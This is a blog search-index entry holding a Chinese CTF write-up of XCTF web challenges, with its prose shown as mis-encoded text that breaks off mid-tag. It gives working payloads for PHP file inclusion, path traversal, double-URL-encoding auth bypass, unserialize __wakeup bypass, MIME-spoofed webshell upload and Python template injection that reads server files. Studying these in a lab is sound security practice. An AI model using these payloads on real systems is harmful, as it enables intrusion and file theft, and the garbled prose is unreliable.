<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>adworld</title>
    <link href="/2020/11/30/adworld/"/>
    <url>/2020/11/30/adworld/</url>
    
    <content type="html"><![CDATA[<p>ä¸ºäº†å®Œæˆç½‘å®‰ä½œä¸šå¿…é¡»å¤šåšç‚¹é¢˜ï¼Œé¡ºä¾¿å†™wp</p><a id="more"></a><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>åˆ©ç”¨phpä¼ªåè®®ä¸Šä¼ ä¸€æ®µphpä»£ç åæ‰§è¡Œï¼Œåˆ—å‡ºç›®å½•çœ‹åˆ°flagæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/12/04/ApRxaQX5nhbdD87.png" srcset="/img/loading.gif" alt="image-20201204225248794"></p><p>å†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«è¯»å–flag</p><div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://220.249.52.133:46457/?page=http://127.0.0.1/index.php/?hello=<span class="hljs-number">%3</span>C?show_source(<span class="hljs-number">%22</span>fl4gisisish3r3.php<span class="hljs-number">%22</span>);?<span class="hljs-number">%3</span>E</code></pre></div><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>æŸ¥çœ‹æºç çœ‹åˆ°source.phpï¼Œè®¿é—®çœ‹åˆ°æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><span class="hljs-class">    </span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span></span><span class="hljs-function">        </span>&#123;            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;            &#125;            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            $_page = mb_substr(                $page,                <span class="hljs-number">0</span>,                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)            );            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                <span class="hljs-number">0</span>,                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)            );            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])    ) &#123;        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];        <span class="hljs-keyword">exit</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;    &#125;  <span class="hljs-meta">?&gt;</span></code></pre></div><p>æºç ä¸­æœ‰ä¸€ä¸ªhint.phpï¼ŒæŸ¥çœ‹å¾—åˆ°</p><div class="hljs"><pre><code class="hljs smali">flag<span class="hljs-built_in"> not </span>here,<span class="hljs-built_in"> and </span>flag in ffffllllaaaagggg</code></pre></div><p>è®¿é—® <code>ffffllllaaaagggg</code>ï¼Œå‘ç°æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯åœ¨æ ¹ç›®å½•ã€‚</p><p>ç»§ç»­çœ‹ä»£ç æœ‰ä¸ªç™½åå•</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">source</span><span class="hljs-selector-class">.php</span>,<span class="hljs-selector-tag">hint</span><span class="hljs-selector-class">.php</span></code></pre></div><p>mb_substrå‡½æ•°ä¼šæˆªå–<code>?</code>å‰é¢çš„å­—ç¬¦è¿”å›ç»™pageï¼Œæ£€æµ‹å…¶æ˜¯å¦åœ¨ç™½åå•ä¸­</p><p>æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªurldecode()ï¼Œæ‰€ä»¥æäº¤å‰éœ€è¦è¿›è¡Œä¸¤æ¬¡urlencode</p><p>è§£ç åé‡å¤ä¸Šé¢ä¸¤æ­¥</p><div class="hljs"><pre><code class="hljs php">$_page = mb_substr($_page,<span class="hljs-number">0</span>,mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>));<span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;   <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;</code></pre></div><p>ä¹‹åé€šè¿‡includeå‡½æ•°è·å–flag</p><p>æ‰€ä»¥æ„é€ çš„payloadä¸­urlè§£ç å?å‰çš„å†…å®¹å¿…é¡»æ˜¯  <code>source.php</code>æˆ–è€…<code>hint.php</code></p><p>payload:</p><div class="hljs"><pre><code class="hljs awk">GET:?page=hint.php%<span class="hljs-number">253</span>F<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre></div><p>åŸç†æ˜¯<code>hint.php?/</code>è¢«å½“ä½œç›®å½•</p><p>../æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œè¿™é‡Œå¤šå‡ ä¸ª../ä¹Ÿæ²¡äº‹ï¼Œå¿…é¡»ä¿è¯è¿”å›åˆ°æ ¹ç›®å½•ï¼Œè€Œåœ¨æ ¹ç›®å½•å‘ä¸Šè¿”å›è¿˜æ˜¯æ ¹ç›®å½•ã€‚</p><p>æ‰€ä»¥ä¸Šé¢çš„payloadå¯ä»¥åœ¨æ ¹ç›®å½•è¯»å–åˆ°flagã€‚</p><h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>ä¸‹è½½é™„ä»¶æ‰“å¼€åæ˜¾ç¤ºæœ‰ä¹±ç ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œäºæ˜¯æ”¹åç¼€ä¼ªhtml ,åœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œå‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†ã€‚</p><p>ç»§ç»­çœ‹ä»£ç ï¼Œçœ‹åˆ°å‡½æ•°çš„æœ€åæœ‰ä¸ª<code>eval</code>å‡½æ•°ï¼Œä¸­é—´çš„å‚æ•°ä¸ºeval(_)ï¼Œæ­£å¥½ä¸å¼€å¤´å®šä¹‰çš„åç›¸åŒ<code>&lt;script&gt;_=&#39;function</code>ï¼Œæ‰€ä»¥æƒ³åŠæ³•æŠŠåŸå‡½æ•°æ˜¾ç¤ºå¤„ç†</p><p>å°†evalæ”¹ä¸ºalertï¼Œä¿å­˜ååœ¨æµè§ˆå™¨ä¸­æ‰“å¼€çœ‹åˆ°å¼¹æ¡†ä¸­å‡ºç°æºç ã€‚</p><p>åœ¨çº¿æ ¼å¼åŒ–åçš„ç»“æœ</p><div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"c"</span>).value;    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">"fl"</span>, <span class="hljs-string">"s_a"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"e&#125;"</span>];        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"_h0l"</span>, <span class="hljs-string">"n"</span>];        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">"g&#123;"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"_0"</span>];        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">"it'"</span>, <span class="hljs-string">"_"</span>, <span class="hljs-string">"n"</span>];        <span class="hljs-keyword">var</span> s = [t, n, r, i];        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)        &#125;    &#125;&#125;<span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);<span class="hljs-keyword">delete</span> _</code></pre></div><p>å†çœ‹è¿™æ®µjsä»£ç ä¸­çš„ifè¯­å¥</p><div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>)</code></pre></div><p>å‚æ•°eçš„é•¿åº¦ä¸º16ï¼Œå…¶ä¸­è¦åŒ…å«</p><div class="hljs"><pre><code class="hljs angelscript">be0f23å¼€å¤´  <span class="hljs-number">233</span>ac   e98aaç»“å°¾     c7be9</code></pre></div><p>é€šè¿‡ifè¯­å¥åä¼šé€šè¿‡ä¸€ä¸ªç®—æ³•å°†flagç®—å‡ºæ¥</p><p>ok,é‚£å°±æŒ‰ifè¯­å¥çš„è¦æ±‚å†™å‡ºe</p><div class="hljs"><pre><code class="hljs plain">be0f233ac7be98aa</code></pre></div><p>è¿˜å¯ä»¥ç›´æ¥åˆ©ç”¨</p><div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">"fl"</span>, <span class="hljs-string">"s_a"</span>, <span class="hljs-string">"i"</span>, <span class="hljs-string">"e&#125;"</span>];      <span class="hljs-keyword">var</span> n = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"_h0l"</span>, <span class="hljs-string">"n"</span>];      <span class="hljs-keyword">var</span> r = [<span class="hljs-string">"g&#123;"</span>, <span class="hljs-string">"e"</span>, <span class="hljs-string">"_0"</span>];      <span class="hljs-keyword">var</span> i = [<span class="hljs-string">"it'"</span>, <span class="hljs-string">"_"</span>, <span class="hljs-string">"n"</span>];      <span class="hljs-keyword">var</span> s = [t, n, r, i];      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;          <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);          s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)      &#125;</code></pre></div><p>åœ¨æµè§ˆå™¨çš„consoleä¸­è¿è¡Œ</p><p><img src="https://i.loli.net/2020/12/01/fA5vLyShNcro2Ow.png" srcset="/img/loading.gif" alt="image-20201201230236591"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$miwen=<span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span><span class="hljs-params">($str)</span></span>&#123;    $_o=strrev($str);    <span class="hljs-comment">// echo $_o;</span>            <span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;               $_c=substr($_o,$_0,<span class="hljs-number">1</span>);        $__=ord($_c)+<span class="hljs-number">1</span>;        $_c=chr($__);        $_=$_.$_c;       &#125;     <span class="hljs-keyword">return</span> str_rot13(strrev(base64_encode($_)));&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">/*</span><span class="hljs-comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span><span class="hljs-comment">*/</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>äº†è§£å‡ ä¸ªå‡½æ•°çš„ç”¨æ³•</p><blockquote><p>str_rot13() å‡½æ•°å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚</p><p>ROT13 ç¼–ç æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚</p><p><strong>æç¤ºï¼š</strong>ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±ç›¸åŒçš„å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæ‚¨æŠŠå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²ã€‚</p><p>strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚</p></blockquote><p><img src="https://i.loli.net/2020/12/01/LMmUQRWEsx8jceg.png" srcset="/img/loading.gif" alt="image-20201201232139218"></p><p>è§£å¯†è„šæœ¬</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str = <span class="hljs-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span><span class="hljs-params">($str)</span></span>&#123;    $s = base64_decode(strrev(str_rot13($str)));    <span class="hljs-comment">//echo($s);</span>    <span class="hljs-keyword">for</span>($_0=<span class="hljs-number">0</span>;$_0&lt;strlen($s);$_0++)&#123;        $_c=substr($s,$_0,<span class="hljs-number">1</span>);        $__=ord($_c)<span class="hljs-number">-1</span>;        $_c=chr($__);        $_=$_.$_c;    &#125;    <span class="hljs-keyword">echo</span> strrev($_);&#125;decode($str);<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>è¿™é¢˜åº”è¯¥ç»™ä¸ªæç¤ºçš„ï¼Œè®¿é—®index.phpsè·å–æºç ã€‚</p><p>phpsï¼Œç”¨å¾¡å‰‘å’Œdirsearchéƒ½æ‰«ä¸å‡ºæ¥ï¼Œæ‰€ä»¥å¿…é¡»çŸ¥é“æ‰å¯èƒ½åšå‡ºæ¥ã€‚</p><p>ç»™æ–°ç”Ÿèµ›å‡ºé¢˜çš„æƒ³æ³•æ¥æºï¼Œå½“æ—¶åšè¿™é¢˜çš„æ—¶å€™è´¹äº†å¥½å¤§åŠ²æ‰æ‰¾åˆ°index.phpsï¼Œæ‰€ä»¥ä¹Ÿè®©è®©èŒæ–°ä»¬ä½“éªŒä¸€ä¸‹æ‰¾ä¸åˆ°çš„ç»æœ›ğŸ¤£</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-string">"admin"</span>===$_GET[id]) &#123;  <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);  <span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"admin"</span>)&#123;  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;"</span>;&#125;<span class="hljs-meta">?&gt;</span>Can you anthenticate to this website?</code></pre></div><p>è·å–idåurldecodeä¹‹åå†èµ‹å€¼ç»™idï¼Œè¦æ³¨æ„ä¸Šä¼ çš„å‚æ•°æµè§ˆå™¨ä¼šå­—æ®µä¸€æ¬¡urldecodeï¼Œæ‰€ä»¥è¿™é‡Œçš„adminéœ€è¦ä¸¤æ¬¡urlencode</p><p>payloadï¼š</p><div class="hljs"><pre><code class="hljs xquery">admin<span class="hljs-meta">%61</span><span class="hljs-meta">%64</span><span class="hljs-meta">%6D</span><span class="hljs-meta">%69</span><span class="hljs-meta">%6E</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span>GET:<span class="hljs-built_in">?id</span>=<span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%44</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%39</span><span class="hljs-meta">%25</span><span class="hljs-meta">%36</span><span class="hljs-meta">%45</span></code></pre></div><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>å¾ˆç®€å•çš„unserialize</p><p>åˆ©ç”¨æ¼æ´ï¼Œå½“å±æ€§å€¼å¤§äºçœŸæ˜¯å±æ€§å€¼çš„æ—¶å€™ä¼šè·³è¿‡wakeupå‡½æ•°ï¼Œphpç‰ˆæœ¬å°äº5.6</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">// public function __wakeup()&#123;</span><span class="hljs-comment">//     exit('bad requests');</span><span class="hljs-comment">// &#125;</span>&#125;$c = <span class="hljs-keyword">new</span> xctf();<span class="hljs-keyword">echo</span>(serialize($c));<span class="hljs-meta">?&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs groovy"><span class="hljs-string">O:</span><span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;&#125;<span class="hljs-string">GET:</span>?code=O:<span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;&#125;</code></pre></div><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>æŠ“åŒ…ä¿®æ”¹MIMEä¸ºimage/jpeg,å³å¯ä¸Šä¼ æˆåŠŸï¼Œä¹‹åèšå‰‘è¿æ¥æ‹¿åˆ°flagã€‚</p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>æ¨¡æ¿æ³¨å…¥ï¼Œå’Œcumtctfåä¸ºæ¯å¾ˆåƒï¼Œä½†æ˜¯æ²¡é‚£ä¸ªéš¾ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œåœ¨urlåè¾“å…¥ 49ï¼Œæ˜¾ç¤ºé¡µé¢å¦‚ä¸‹ï¼Œå¯ä»¥ç¡®å®šå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å€¼è¢«å…¶å½“ä½œå˜é‡å¸¦å…¥è®¡ç®—ã€‚</p><p><img src="https://i.loli.net/2020/12/02/NyPSIhg9Yv4Jbzp.png" srcset="/img/loading.gif" alt="20201202085851.png"></p><p>æ¨¡æ¿æ³¨å…¥åŸç†è¿™ç¯‡åšå®¢å†™çš„å¾ˆè¯¦ç»†ï¼š<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p><p>å‡ ä¸ªå¸¸ç”¨çš„é­”æœ¯æ–¹æ³•</p><blockquote><p>_<em>class_</em>  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ </p><p>_<em>mro_</em>    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</p><p> _<em>base_</em>   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±» // <strong>base</strong>å’Œ<strong>mro</strong>éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ </p><p>_<em>subclasses_</em>   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨ </p><p>_<em>init_</em>  ç±»çš„åˆå§‹åŒ–æ–¹æ³•</p><p> _<em>globals_</em>  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•</p><p>ç›´æ¥å¼€å§‹è¿™é¢˜</p></blockquote><p>1.æŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼Œå…¶ä¸­ç¬¬41ä¸ªæ¨¡å—fileå’Œ72ä¸ªæ¨¡å—ï¼ŒåŒ…å«æ–‡ä»¶è¯»å–çš„ç›¸å…³æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨</p><div class="hljs"><pre><code class="hljs clojure">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code></pre></div><p><img src="https://i.loli.net/2020/12/02/j9Ahcr8sOaSyEPt.png" srcset="/img/loading.gif" alt="image-20201202090652367"></p><p>2.åˆ—å‡ºæ–‡ä»¶ç›®å½•</p><div class="hljs"><pre><code class="hljs clojure">&#123;&#123;''.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__['os'].listdir(<span class="hljs-name">'.'</span>)&#125;&#125;</code></pre></div><p><img src="https://i.loli.net/2020/12/02/hSIWxNvpBwqe2Qt.png" srcset="/img/loading.gif" alt="image-20201202094836434"></p><p>3.è¯»å–flag</p><div class="hljs"><pre><code class="hljs markdown">''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">'fl4g'</span>).read()</code></pre></div><p><img src="https://i.loli.net/2020/12/02/Qxdc9U1GbrzYvSg.png" srcset="/img/loading.gif" alt="image-20201202094926424"></p><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p><strong>Tornado</strong>å…¨ç§°<strong>Tornado Web Server</strong>ï¼Œæ˜¯ä¸€ä¸ªç”¨<a href="https://zh.m.wikipedia.org/wiki/Python" target="_blank" rel="noopener">Python</a>è¯­è¨€å†™æˆçš„<a href="https://zh.m.wikipedia.org/wiki/WebæœåŠ¡å™¨" target="_blank" rel="noopener">WebæœåŠ¡å™¨</a>å…¼<a href="https://zh.m.wikipedia.org/wiki/Webåº”ç”¨æ¡†æ¶" target="_blank" rel="noopener">Webåº”ç”¨æ¡†æ¶</a>ï¼Œç”±FriendFeedå…¬å¸åœ¨è‡ªå·±çš„ç½‘ç«™<a href="https://zh.m.wikipedia.org/wiki/FriendFeed" target="_blank" rel="noopener">FriendFeed</a>ä¸­ä½¿ç”¨ï¼Œè¢«<a href="https://zh.m.wikipedia.org/wiki/Facebook" target="_blank" rel="noopener">Facebook</a>æ”¶è´­ä»¥åæ¡†æ¶ä»¥<a href="https://zh.m.wikipedia.org/wiki/å¼€æºè½¯ä»¶" target="_blank" rel="noopener">å¼€æºè½¯ä»¶</a>å½¢å¼å¼€æ”¾ç»™å¤§ä¼—ã€‚</p><p>è¿™åˆæ˜¯webæœåŠ¡å™¨å’Œwebåº”ç”¨æ¡†æ¶ï¼Œä¼šä¸ä¼šå’Œflaskæ¡†æ¶ä¸€æ ·å­˜åœ¨æ¨¡æ¿æ¨¡æ¿æ³¨å…¥</p><h3 id="0x1åŸç†"><a href="#0x1åŸç†" class="headerlink" title="0x1åŸç†"></a><strong>0x1åŸç†</strong></h3><p>tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡{{}}è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p><h3 id="0x2è§£é¢˜"><a href="#0x2è§£é¢˜" class="headerlink" title="0x2è§£é¢˜"></a>0x2è§£é¢˜</h3><p>1.å…ˆçœ‹çœ‹é¢˜ç›®ç»™çš„è¿æ¥</p><div class="hljs"><pre><code class="hljs sas">http://220.249.52.133:43538/<span class="hljs-meta">file</span>?<span class="hljs-meta">filename</span>=/welcome.txt<span class="hljs-variable">&amp;filehash</span>=34b3f8fdcf2ec4394a5b9b20580c0096</code></pre></div><p>æäº¤çš„å‚æ•°æ˜¯æ–‡ä»¶åå’Œæ–‡ä»¶çš„hashå€¼</p><p>å¹¶ä¸”ç»™äº†ä¸‰webé¡µé¢</p><div class="hljs"><pre><code class="hljs jboss-cli"><span class="hljs-string">/flag.txt</span><span class="hljs-string">/welcome.txt</span><span class="hljs-string">/hints.txt</span></code></pre></div><p>flag.txt</p><div class="hljs"><pre><code class="hljs jboss-cli">flag in <span class="hljs-string">/fllllllllllllag</span></code></pre></div><p>hints.txtç»™çš„æç¤º</p><div class="hljs"><pre><code class="hljs stylus">/hints.txt<span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre></div><p>è¿™å°±çŸ¥é“äº†<code>filehash</code>çš„æ¥æºäº†</p><p>2.è¯»å–flag.txtå°±å¿…é¡»æ„é€ payloadï¼š</p><div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>?filename=<span class="hljs-regexp">/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(/</span>fllllllllllllag))</code></pre></div><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“cookie_secret çš„å€¼ï¼Œå…ˆæäº¤è¯•è¯•</p><p><img src="https://i.loli.net/2020/12/02/7GzhFyxqJT9ZwNH.png" srcset="/img/loading.gif" 